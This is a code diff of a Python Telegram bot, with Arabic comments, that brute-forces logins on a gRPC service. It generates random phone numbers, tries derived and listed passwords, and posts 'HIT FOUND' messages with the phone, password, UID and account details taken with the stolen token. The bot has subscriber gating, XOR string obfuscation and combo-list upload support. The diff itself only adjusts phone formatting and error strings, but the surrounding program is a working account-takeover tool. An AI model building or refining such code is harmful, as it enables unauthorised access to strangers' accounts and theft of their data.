@@ -48,10 +48,13 @@ def is_active_subscriber(user_id):
         expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
         if datetime.now() < expiry_date:
             return True
+        else:
+            # انتهى الاشتراك
+            pass
     return False
 
 # ══════════════════════════════════════════════════════════
-#  XOR obfuscation
+#  XOR obfuscation & Configs
 # ══════════════════════════════════════════════════════════
 def _xd(b):
     return bytes(c ^ 0x5A for c in b).decode()
@@ -175,7 +178,7 @@ class GrpcClient:
             resp = stub(payload, metadata=meta, timeout=timeout)
             return resp, None
         except grpc.RpcError as e:
-            return None, f"{e.code().name}: {e.details()}"
+            return None, str(e.code())
 
     def close(self):
         try: self._ch.close()
@@ -260,8 +263,9 @@ def _gen_phone(cc):
     pref = random.choice(c["prefs"])
     ext = ''.join(str(random.randint(0, 9)) for _ in range(c["ext"]))
     local = pref + ext
-    return c["code"] + local, "0" + local
+    return c["code"] + "-" + local, "0" + local
 
+# تخزين حالات وحلقات الفحص المستقلة لكل مستخدم على حدة
 user_scanners = {}
 user_states = {}
 
@@ -710,7 +714,9 @@ def run_user_scanner(chat_id, message_id, cc):
 
     while user_scanners.get(chat_id, {}).get("is_running", False):
         try:
-            phone, first_pw = _gen_phone(cc)
+            phone_display, first_pw = _gen_phone(cc)
+            phone = phone_display.replace("-", "")
+            
             for pw in [first_pw] + PASSWORDS:
                 if not user_scanners.get(chat_id, {}).get("is_running", False): 
                     break
@@ -730,7 +736,7 @@ def run_user_scanner(chat_id, message_id, cc):
                         state["hits"] += 1
                         acct = _fetch_info(cli, res.get("shortUID", 0), res.get("token", ""))
                         hit_msg = (f"🎯 **HIT FOUND! [عشوائي]**\n\n"
-                                   f"📱 Phone: `{phone}`\n"
+                                   f"📱 Phone: `{phone_display}`\n"
                                    f"🔑 Pass: `{pw}`\n"
                                    f"🆔 UID: `{res.get('uid')}`\n"
                                    f"🔢 Short ID: `{res.get('shortUID')}`\n"
@@ -785,5 +791,5 @@ def run_user_scanner(chat_id, message_id, cc):
         pass
 
 if __name__ == "__main__":
-    print("Bot is running with Combo file upload support...")
+    print("Bot is running with updated gRPC connections and Combo support...")
     bot.infinity_polling()
